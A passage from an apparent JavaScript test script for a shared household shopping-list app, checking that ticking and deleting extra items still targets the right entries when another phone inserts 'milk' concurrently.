    const tickBags = btn('tick-extra', 'bin bags').dataset.v, delFoil = btn('del-extra', 'foil').dataset.v;
    // the other phone adds "milk" at the top of the list before this phone's taps arrive
    await A.w.Store.patch('weeks/' + MON, { 'extras.xm': { name: 'milk', done: false, o: 1 } }); await wait(400);
    await A.act('tick-extra', tickBags, null, 300); await A.act('del-extra', delFoil, null, 300);
    const ex = (A.docAt('households/h1/weeks/' + MON) || {}).extras || {};
    ok(ex.xb && ex.xb.done === true && ex.xm && !ex.xm.done && !ex.xa, 'extras: the item you tapped is the one ticked or removed (' + JSON.stringify(ex) + ')');
  }
  console.log(fails ? fails + ' FAILED' : 'all passed');
  process.exit(fails ? 1 : 0);
})();
